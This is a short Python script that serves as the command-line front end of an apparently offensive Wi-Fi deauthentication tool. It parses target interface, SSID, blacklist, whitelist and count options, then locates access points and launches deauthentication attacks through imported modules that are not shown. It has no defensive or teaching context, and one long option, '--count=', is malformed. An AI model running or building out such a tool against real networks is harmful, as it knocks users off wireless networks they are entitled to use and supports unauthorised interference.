import sys
import getopt
from other import resources
from other import values
from modules import deauths


toolBox = resources.resource()
superValues = values.value()
deauthMod = deauths.deauth(superValues) 

argv = sys.argv[1:]

options, args = getopt.getopt(argv, "hi:b:B:w:W:s:Sc:", ["help", "blacklist=", "interface=", "blacklistFile=", "whitelist=", "whitelistFile=","SSIDdict", "SSID=", "--count="])




for option, arg in options:

    if option in ["-h", "--help"]:
        toolBox.displayHelp()
    if option in ["-i", "--interface"]:
        superValues.interfaceName = arg
    if option in ["-b", "--blacklist"]:
        superValues.blacklist.append(arg)
    if option in ["-B", "--blacklistFile"]:
        superValues.blacklistFile = arg
    if option in ["-w", "--whitelist"]:
        superValues.whitelist = arg
    if option in ["-W", "--whitelistFile"]:
        superValues.whitelistFile = arg
    if option in ["-s", "--SSID"]:
        superValues.SSID = arg
    if option in ["-S", "--SSIDdict"]:
        superValues.SSIDdict = True
    if option in ["-c", "--count"]:
        superValues.count = arg

if (options == []):
    toolBox.displayBasicHelp()


#print the given values
#toolBox.printSuperValues(superValues)


#find APs
deauthMod.findAP()

#send de auth attacks 
deauthMod.attack()










